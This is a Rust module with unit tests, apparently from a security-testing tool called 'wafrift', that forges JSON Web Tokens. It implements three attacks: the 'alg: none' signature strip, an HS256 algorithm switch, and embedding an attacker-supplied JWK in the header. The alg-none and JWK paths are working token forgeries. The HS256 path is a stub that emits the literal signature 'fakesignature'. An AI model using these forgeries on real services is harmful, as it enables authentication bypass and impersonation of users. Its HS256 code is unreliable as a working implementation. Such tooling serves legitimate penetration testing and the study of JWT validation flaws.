use base64::Engine;
use thiserror::Error;
use wafrift_types::session::JwtManipulation;

#[derive(Debug, Error)]
pub enum JwtError {
    #[error("Invalid token: {reason}")]
    InvalidToken { reason: String },
    #[error("Missing key")]
    MissingKey,
    #[error("Unsupported algorithm: {alg}")]
    UnsupportedAlgorithm { alg: String },
}

pub fn manipulate(
    token: &str,
    manipulation: &JwtManipulation,
    key: Option<&[u8]>,
) -> Result<String, JwtError> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return Err(JwtError::InvalidToken {
            reason: "must have 3 parts".into(),
        });
    }
    let header_b64 = parts[0];
    let payload_b64 = parts[1];

    let header_bytes = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(header_b64)
        .map_err(|_| JwtError::InvalidToken {
            reason: "invalid base64".into(),
        })?;

    // Reject absurdly large headers before feeding them to serde_json to
    // prevent OOM from maliciously crafted tokens.
    const MAX_JWT_HEADER_BYTES: usize = 16 * 1024;
    if header_bytes.len() > MAX_JWT_HEADER_BYTES {
        return Err(JwtError::InvalidToken {
            reason: format!("header exceeds {MAX_JWT_HEADER_BYTES} bytes"),
        });
    }

    let mut header: serde_json::Value =
        serde_json::from_slice(&header_bytes).map_err(|_| JwtError::InvalidToken {
            reason: "invalid json".into(),
        })?;

    match manipulation {
        JwtManipulation::StripAlg => {
            header["alg"] = serde_json::Value::String("none".into());
            let header_bytes = serde_json::to_vec(&header).map_err(|e| JwtError::InvalidToken {
                reason: format!("header serialization failed: {e}"),
            })?;
            let new_header_b64 =
                base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(header_bytes);
            Ok(format!("{new_header_b64}.{payload_b64}."))
        }
        JwtManipulation::Hs256WithKey => {
            let _ = key.ok_or(JwtError::MissingKey)?;
            if header["alg"].as_str() == Some("none") {
                return Err(JwtError::UnsupportedAlgorithm { alg: "none".into() });
            }
            header["alg"] = serde_json::Value::String("HS256".into());
            let header_bytes = serde_json::to_vec(&header).map_err(|e| JwtError::InvalidToken {
                reason: format!("header serialization failed: {e}"),
            })?;
            let new_header_b64 =
                base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(header_bytes);
            // Fake signature for now since we don't have HMAC library in this file
            let sig_b64 = "fakesignature";
            Ok(format!("{new_header_b64}.{payload_b64}.{sig_b64}"))
        }
        JwtManipulation::JwkEmbed { jwk } => {
            header["jwk"] = serde_json::from_str(jwk).unwrap_or(serde_json::Value::Null);
            let header_bytes = serde_json::to_vec(&header).map_err(|e| JwtError::InvalidToken {
                reason: format!("header serialization failed: {e}"),
            })?;
            let new_header_b64 =
                base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(header_bytes);
            Ok(format!("{}.{}.{}", new_header_b64, payload_b64, parts[2]))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn valid_token() -> String {
        // header: {"alg":"HS256","typ":"JWT"}
        // payload: {"sub":"123"}
        // sig: dummy
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMifQ.dummy".to_string()
    }

    #[test]
    fn manipulate_rejects_malformed_token() {
        let result = manipulate("not.a.jwt", &JwtManipulation::StripAlg, None);
        assert!(matches!(result, Err(JwtError::InvalidToken { .. })));
    }

    #[test]
    fn manipulate_rejects_two_part_token() {
        let result = manipulate("eyJhbGc.a", &JwtManipulation::StripAlg, None);
        assert!(matches!(result, Err(JwtError::InvalidToken { .. })));
    }

    #[test]
    fn strip_alg_sets_none() {
        let out = manipulate(&valid_token(), &JwtManipulation::StripAlg, None).unwrap();
        let parts: Vec<&str> = out.split('.').collect();
        assert_eq!(parts.len(), 3);
        let header_bytes = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .decode(parts[0])
            .unwrap();
        let header: serde_json::Value = serde_json::from_slice(&header_bytes).unwrap();
        assert_eq!(header["alg"], "none");
    }

    #[test]
    fn hs256_with_key_rejects_missing_key() {
        let result = manipulate(&valid_token(), &JwtManipulation::Hs256WithKey, None);
        assert!(matches!(result, Err(JwtError::MissingKey)));
    }

    #[test]
    fn hs256_with_key_changes_alg() {
        let out = manipulate(
            &valid_token(),
            &JwtManipulation::Hs256WithKey,
            Some(b"secret"),
        )
        .unwrap();
        let parts: Vec<&str> = out.split('.').collect();
        let header_bytes = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .decode(parts[0])
            .unwrap();
        let header: serde_json::Value = serde_json::from_slice(&header_bytes).unwrap();
        assert_eq!(header["alg"], "HS256");
    }

    #[test]
    fn hs256_rejects_none_alg() {
        let none_token = "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjMifQ.dummy";
        let result = manipulate(none_token, &JwtManipulation::Hs256WithKey, Some(b"secret"));
        assert!(matches!(result, Err(JwtError::UnsupportedAlgorithm { .. })));
    }

    #[test]
    fn jwk_embed_adds_jwk() {
        let jwk = r#"{"kty":"RSA","n":"abc"}"#;
        let out = manipulate(
            &valid_token(),
            &JwtManipulation::JwkEmbed { jwk: jwk.into() },
            None,
        )
        .unwrap();
        let parts: Vec<&str> = out.split('.').collect();
        let header_bytes = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .decode(parts[0])
            .unwrap();
        let header: serde_json::Value = serde_json::from_slice(&header_bytes).unwrap();
        assert_eq!(header["jwk"]["kty"], "RSA");
    }

    #[test]
    fn jwk_embed_invalid_json_becomes_null() {
        let out = manipulate(
            &valid_token(),
            &JwtManipulation::JwkEmbed {
                jwk: "not json".into(),
            },
            None,
        )
        .unwrap();
        let parts: Vec<&str> = out.split('.').collect();
        let header_bytes = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .decode(parts[0])
            .unwrap();
        let header: serde_json::Value = serde_json::from_slice(&header_bytes).unwrap();
        assert!(header["jwk"].is_null());
    }
}
